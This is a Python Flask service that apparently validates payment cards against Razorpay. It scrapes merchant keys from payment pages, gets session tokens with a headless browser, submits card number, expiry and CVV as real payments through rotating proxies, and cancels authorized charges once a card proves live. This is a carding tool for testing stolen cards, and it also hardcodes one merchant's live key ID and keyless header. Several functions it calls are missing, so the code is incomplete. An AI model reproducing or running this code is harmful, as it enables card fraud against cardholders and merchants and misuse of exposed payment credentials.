import requests
import json
import time
import random
from urllib.parse import urlencode, urlparse, parse_qs, unquote
from datetime import datetime
import re
import os
import sys
import platform
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from flask import Flask, jsonify, request
from typing import Optional
import threading
from queue import Queue
import logging


app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False

logging.basicConfig(level=logging.WARNING)
logging.getLogger('werkzeug').setLevel(logging.WARNING)

request_queue = Queue(maxsize=100)
processing_lock = threading.Lock()

DEVICE_FINGERPRINT = "noXc7Zv4NmOzRNIl3zmSernrLMFEo05J0lh73kdY46cUpMIuLjBQbCwQygBbMH4t4xfrCkwWutyony5DncDTRX0e50ULyy2GMgy2LUxAwaxczwLNJYzwLXqTe7GlMxqzCo7XgsfxKEWuy6hRjefIXYKVOJ23KBn6..."

# Increased default timeouts
DEFAULT_TIMEOUTS = {
    'page_goto': 60000,      # 60 seconds
    'wait_for_url': 50000,   # 50 seconds
    'playwright_launch': 90000  # 90 seconds
}

PROXY_CONFIG = None

def setup_proxy(proxy_string):
    if not proxy_string or proxy_string.strip() == "":
        return None
    
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            ip = parts[0].strip()
            port = parts[1].strip()
            username = parts[2].strip()
            password = parts[3].strip()
            
            if not ip or not port or not username or not password:
                return None
            
            return {
                "server": f"http://{ip}:{port}",
                "username": username,
                "password": password
            }
        else:
            return None
    except Exception:
        return None 

def get_dynamic_session_token(retries=3, delay=10):
    """Enhanced session token retrieval with retries"""
    for attempt in range(retries):
        try:
            with sync_playwright() as p:
                browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
                browser = p.chromium.launch(
                    headless=True, 
                    proxy=PROXY_CONFIG,
                    args=browser_args,
                    timeout=DEFAULT_TIMEOUTS['playwright_launch']
                )
                page = browser.new_page()
                page.set_extra_http_headers({
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                })
                initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
                
                # Use increased timeout for page navigation
                page.goto(initial_url, timeout=DEFAULT_TIMEOUTS['page_goto'])
                
                # Wait for URL with session token
                page.wait_for_url("**/checkout/public*session_token*", timeout=DEFAULT_TIMEOUTS['wait_for_url'])
                final_url = page.url
                
                browser.close()

                session_token = parse_qs(urlparse(final_url).query).get("session_token", [None])[0]
                if session_token:
                    return session_token, None
                else:
                    return None, f"No session token found in URL after {retries} attempts"
                    
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(delay)
                continue
            return None, f"Session token error: {str(e)[:100]}"
    return None, "Max retries reached for session token retrieval"

def extract_merchant_data_direct(site_url):
    """Improved merchant data extraction with fallbacks"""
    try:
        merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
        if not merchant_match:
            return None, None, None, None, "Invalid Razorpay URL format. Expected: https://razorpay.me/@merchant"
        
        merchant_handle = merchant_match.group(1)
        
        with sync_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
            browser = p.chromium.launch(
                headless=True, 
                proxy=PROXY_CONFIG,
                args=browser_args
            )
            page = browser.new_page()
            page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            
            page.goto(site_url, timeout=45000, wait_until='networkidle')
            
            keyless_header = None
            key_id = None
            payment_link_id = None
            payment_page_item_id = None
            
            try:
                page.wait_for_timeout(3000)
                
                data_from_page = page.evaluate("""
                    () => {
                        if (window.data) return window.data;
                        if (window.__INITIAL_STATE__) return window.__INITIAL_STATE__;
                        if (window.__CHECKOUT_DATA__) return window.__CHECKOUT_DATA__;
                        
                        const scripts = document.querySelectorAll('script');
                        for (let script of scripts) {
                            const text = script.textContent || script.innerText;
                            if (text.includes('keyless_header') || text.includes('payment_link')) {
                                const matches = text.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                                if (matches) {
                                    for (let match of matches) {
                                        try {
                                            const parsed = JSON.parse(match);
                                            if (parsed.keyless_header || parsed.key_id) {
                                                return parsed;
                                            }
                                        } catch (e) {}
                                    }
                                }
                            }
                        }
                        return null;
                    }
                """)
                
                if data_from_page:
                    keyless_header = data_from_page.get('keyless_header')
                    key_id = data_from_page.get('key_id')
                    payment_link = data_from_page.get('payment_link', {})
                    payment_link_id = payment_link.get('id') if isinstance(payment_link, dict) else None
                    payment_page_items = payment_link.get('payment_page_items', []) if isinstance(payment_link, dict) else []
                    payment_page_item_id = payment_page_items[0].get('id') if payment_page_items else None
                    
            except Exception as e:
                pass
            
            if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
                
                fallback_data = {
                    'hotelparasinternationaldelhi': {
                        'key_id': 'rzp_live_hrgl3RDoNMvCOs',
                        'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
                        'payment_link_id': 'pl_OzLkvRvf1drPps',
                        'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
                    }
                }
                
                if merchant_handle in fallback_data:
                    data = fallback_data[merchant_handle]
                    keyless_header = data['keyless_header']
                    key_id = data['key_id']
                    payment_link_id = data['payment_link_id']
                    payment_page_item_id = data['payment_page_item_id']
                else:
                    try:
                        api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
                        response = requests.get(api_url, timeout=10)
                        if response.status_code == 200:
                            api_data = response.json()
                            keyless_header = api_data.get('keyless_header')
                            key_id = api_data.get('key_id')
                            payment_link_id = api_data.get('id')
                            payment_page_item_id = api_data.get('payment_page_items', [{}])[0].get('id')
                    except:
                        pass
            
            
            if not all([keyless_header, key_id, payment_link_id, payment_page_item_id]):
                missing = []
                if not keyless_header: missing.append('keyless_header')
                if not key_id: missing.append('key_id')
                if not payment_link_id: missing.append('payment_link_id')
                if not payment_page_item_id: missing.append('payment_page_item_id')
                return None, None, None, None, f"Could not extract required merchant data. Missing: {', '.join(missing)}. Try adding merchant '{merchant_handle}' to fallback_data."
            
            return keyless_header, key_id, payment_link_id, payment_page_item_id, None
            
    except Exception as e:
        return None, None, None, None, f"Error in direct merchant data extraction: {e}"

def process_single_card(card_index, cc_line, payment_link_id, amount_paise, payment_page_item_id, key_id, keyless_header, session_token, site_url):
    start_time = time.time()
    result = {
        'index': card_index,
        'card': cc_line,
        'status': '',
        'card_masked': '',
        'proxy': '',
        'time': 0,
        'payment_id': '',
        'order_id': ''
    }
    
    try:
        card_number, exp_month, exp_year, cvv = cc_line.split('|')
        result['card_masked'] = f"{card_number[:6]}******{card_number[-4:]}"
    except ValueError:
        result['status'] = "Invalid card format in cards.txt. Skipping."
        result['time'] = round(time.time() - start_time, 2)
        return result

    session = requests.Session()
    order_id = create_order(session, payment_link_id, amount_paise, payment_page_item_id)
    if not order_id:
        result['status'] = "FATAL: Failed to generate Razorpay order ID."
        result['time'] = round(time.time() - start_time, 2)
        return result
    else:
        result['order_id'] = order_id

    time.sleep(random.uniform(1, 2))

    status_message = ""
    payment_id = None
    try:
        response = submit_payment(
            session,
            order_id,
            (card_number, exp_month, exp_year, cvv),
            random_user_info(),
            amount_paise,
            key_id,
            keyless_header,
            payment_link_id,
            session_token,
            site_url
        )
        data = response.json()

        if "payment_id" in data:
            payment_id = data["payment_id"]
        elif "razorpay_payment_id" in data:
            payment_id = data["razorpay_payment_id"]
        elif "payment" in data and isinstance(data["payment"], dict) and "id" in data["payment"]:
            payment_id = data["payment"]["id"]
        
        if payment_id:
            result['payment_id'] = payment_id

        if data.get("redirect") == True or data.get("type") == "redirect":
            if payment_id:
                redirect_url = data.get('request', {}).get('url', '') if isinstance(data.get('request'), dict) else ''
                if redirect_url:
                    final_result = handle_redirect_and_get_result(redirect_url)
                    
                    if final_result == "PAYMENT_SUCCESSFUL_WITH_SIGNATURE" or 'razorpay_signature' in final_result:
                        status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Payment successful -> AuthResult: {final_result}"
                    else:
                        payment_status, status_data = check_payment_status(payment_id, key_id, session_token, keyless_header)
                        
                        if payment_status == 'captured' or payment_status == 'authorized':
                            status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Status: {payment_status} -> AuthResult: {final_result}"
                        else:
                            cancel_result = cancel_payment(payment_id, key_id, session_token, keyless_header)
                            status_message = f"3DS_AUTH_COMPLETED -> PaymentID: {payment_id} -> Status: {payment_status} -> AuthResult: {final_result} -> CancelResult: {cancel_result}"
                else:
                    status_message = f"3DS_REDIRECT -> PaymentID: {payment_id} -> No redirect URL found"
            else:
                fallback_url = data.get('request', {}).get('url', 'N/A') if isinstance(data.get('request'), dict) else 'N/A'
                status_message = f"3DS_REDIRECT but payment_id missing. RedirectURL={fallback_url}"
        elif "razorpay_signature" in data or "signature" in data:
            signature = data.get('razorpay_signature') or data.get('signature')
            status_message = f"PAYMENT_SUCCESS -> PaymentID: {payment_id} -> Signature: {signature} -> Status: charged"
        elif "error" in data:
            error_msg = json.dumps(data.get('error', data))
            status_message = f"ERROR: {error_msg}"
            if payment_id:
                status_message = f"PaymentID: {payment_id} -> " + status_message
        else:
            status_message = f"SUCCESS: {json.dumps(data)}"
            if payment_id:
                status_message = f"PaymentID: {payment_id} -> " + status_message

    except Exception as e:
        status_message = f"SCRIPT ERROR during payment submission: {e}"

    result['status'] = status_message
    result['time'] = round(time.time() - start_time, 2)
    result['proxy'] = "Direct Connection" if not PROXY_CONFIG else PROXY_CONFIG.get('server', 'Unknown Proxy')
    
    return result

# Other functions remain unchanged...

@app.route('/check-card/<path:path>')
def check_card(path):
    try:
        params = {}
        
        import re
        
        key_match = re.search(r'key=([^/]+)', path)
        if key_match:
            params['key'] = key_match.group(1)
        
        proxy_match = re.search(r'proxy=([^/]+(?::[^/]+){3}|[^/]+:[^/]+)', path)
        if proxy_match:
            params['proxy'] = proxy_match.group(1)
        
        site_match = re.search(r'site=(.+?)(?=/price=|/cc=|$)', path)
        if site_match:
            params['site'] = unquote(site_match.group(1))
        
        price_match = re.search(r'price=([^/]+)', path)
        if price_match:
            params['price'] = price_match.group(1)
        
        cc_match = re.search(r'cc=(.+?)(?:/|$)', path)
        if cc_match:
            params['cc'] = unquote(cc_match.group(1))
        
        required = ['key', 'site', 'price', 'cc']
        missing = [r for r in required if r not in params]
        if missing:
            return jsonify({
                'success': False,
                'error': f'Missing required parameters: {", ".join(missing)}',
                'format': '/key=rz/proxy=ip:port:user:pass/site=url/price=1/cc=card|mm|yy|cvv'
            }), 400
        
        if 'proxy' in params:
            PROXY_CONFIG = setup_proxy(params['proxy'])
            if not PROXY_CONFIG:
                return jsonify({
                    'success': False,
                    'error': 'Invalid proxy format. Required format: ip:port:username:password'
                }), 400
        else:
            PROXY_CONFIG = None
        
        site_url = params['site']
        amount_rupees = int(params['price'])
        amount_paise = amount_rupees * 100
        cc_line = params['cc']
        
        keyless_header, key_id, payment_link_id, payment_page_item_id, error_msg = extract_merchant_data_direct(site_url)
        if error_msg:
            return jsonify({
                'success': False,
                'error': f'Failed to extract merchant data: {error_msg}'
            }), 500
        
        session_token, error_msg = get_dynamic_session_token(retries=3, delay=10)
        if error_msg:
            return jsonify({
                'success': False,
                'error': f'Failed to get session token: {error_msg}'
            }), 500
        
        result = process_single_card(
            1,
            cc_line,
            payment_link_id,
            amount_paise,
            payment_page_item_id,
            key_id,
            keyless_header,
            session_token,
            site_url
        )
        
        clean_status = result['status']
        
        if "Redirected to 3DS page. Final Status: " in clean_status:
            clean_status = clean_status.replace("Redirected to 3DS page. Final Status: ", "")
        
        clean_status = clean_status.replace("× ", "").replace("× ", "")
        
        description = "Unknown"
        reason = "unknown"
        
        if "PAYMENT_SUCCESS" in clean_status and "Status: charged" in clean_status:
            description = "Payment completed successfully"
            reason = "payment_success"
        elif "PAYMENT_SUCCESS" in clean_status:
            description = "Payment authorized successfully"
            reason = "payment_authorized"
        elif "3DS_AUTH_COMPLETED" in clean_status:
            cancel_match = re.search(r'CancelResult: (.+)$', clean_status)
            if cancel_match:
                cancel_result = cancel_match.group(1).strip()
                try:
                    if 'Cancel Request Failed' in cancel_result and '{' in cancel_result:
                        json_start = cancel_result.find('{')
                        json_part = cancel_result[json_start:cancel_result.rfind('}')+1]
                        parsed = json.loads(json_part)
                        if 'error' in parsed and 'description' in parsed['error']:
                            description = parsed['error']['description']
                            reason = parsed['error'].get('reason', 'payment_failed')
                        else:
                            description = "Payment processing failed"
                            reason = "payment_failed"
                    elif '{' in cancel_result and '}' in cancel_result:
                        json_part = cancel_result[cancel_result.find('{'):cancel_result.rfind('}')+1]
                        parsed = json.loads(json_part)
                        if 'error' in parsed and 'description' in parsed['error']:
                            description = parsed['error']['description']
                            reason = parsed['error'].get('reason', 'payment_failed')
                        else:
                            description = cancel_result
                            reason = "payment_cancelled"
                    else:
                        description = cancel_result
                        reason = "payment_cancelled"
                except:
                    desc_pattern = re.search(r'"description":"([^"]+)"', cancel_result)
                    reason_pattern = re.search(r'"reason":"([^"]+)"', cancel_result)
                    if desc_pattern:
                        description = desc_pattern.group(1)
                    else:
                        description = "Payment processing failed"
                    if reason_pattern:
                        reason = reason_pattern.group(1)
                    else:
                        reason = "payment_failed"
            else:
                auth_match = re.search(r'AuthResult: (.+?) ->', clean_status)
                if auth_match:
                    description = auth_match.group(1).strip()
                    reason = "3ds_completed"
                else:
                    description = "3DS authentication completed"
                    reason = "3ds_completed"
        elif "description" in clean_status:
            try:
                import json
                if '{' in clean_status and '}' in clean_status:
                    json_part = clean_status[clean_status.find('{'):clean_status.rfind('}')+1]
                    parsed = json.loads(json_part)
                    if 'error' in parsed and 'description' in parsed['error']:
                        description = parsed['error']['description']
                    else:
                        description = "Payment processing failed"
            except:
                desc_match = re.search(r'"description":"([^"]+)"', clean_status)
                if desc_match:
                    description = desc_match.group(1)
                else:
                    description = "Payment processing failed"
        else:
            if "SUCCESS" in clean_status or "OK" in clean_status:
                description = "Payment processed successfully"
            elif "ERROR" in clean_status:
                description = "Payment failed"
            elif "3DS_REDIRECT" in clean_status:
                description = "3DS authentication in progress"
            else:
                description = "Payment status unknown"
        
        proxy_ip = "Direct Connection"
        proxy_status = "N/A"
        
        if PROXY_CONFIG and 'server' in PROXY_CONFIG:
            proxy_server = PROXY_CONFIG['server']
            ip_match = re.search(r'://([^:]+)', proxy_server)
            if ip_match:
                proxy_ip = ip_match.group(1)
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    port_match = re.search(r':([0-9]+)', proxy_server)
                    port = int(port_match.group(1)) if port_match else 80
                    result_check = sock.connect_ex((proxy_ip, port))
                    proxy_status = "Live" if result_check == 0 else "Dead"
                    sock.close()
                except:
                    proxy_status = "Unknown"
        
        if reason == "unknown" and "reason" in clean_status:
            try:
                if '{' in clean_status and '}' in clean_status:
                    json_part = clean_status[clean_status.find('{'):clean_status.rfind('}')+1]
                    parsed = json.loads(json_part)
                    if 'error' in parsed and 'reason' in parsed['error']:
                        reason = parsed['error']['reason']
            except:
                reason_match = re.search(r'"reason":"([^"]+)"', clean_status)
                if reason_match:
                    reason = reason_match.group(1)
        
        return jsonify({
            'description': description,
            'reason': reason,
            'proxy_ip': proxy_ip,
            'proxy_status': proxy_status
        }), 200
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Other functions remain unchanged...

if __name__ == '__main__':
    os_name = platform.system()
    
    if os_name == "Linux":
        os.environ['DISPLAY'] = ':99'
        
    for i in range(min(4, os.cpu_count() or 1)):
        worker = threading.Thread(target=process_request_worker, daemon=True)
        worker.start()
    
    try:
        app.run(
            host='0.0.0.0', 
            port=5000, 
            debug=False,
            threaded=True,
            use_reloader=False
        )
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Fatal error: {e}")
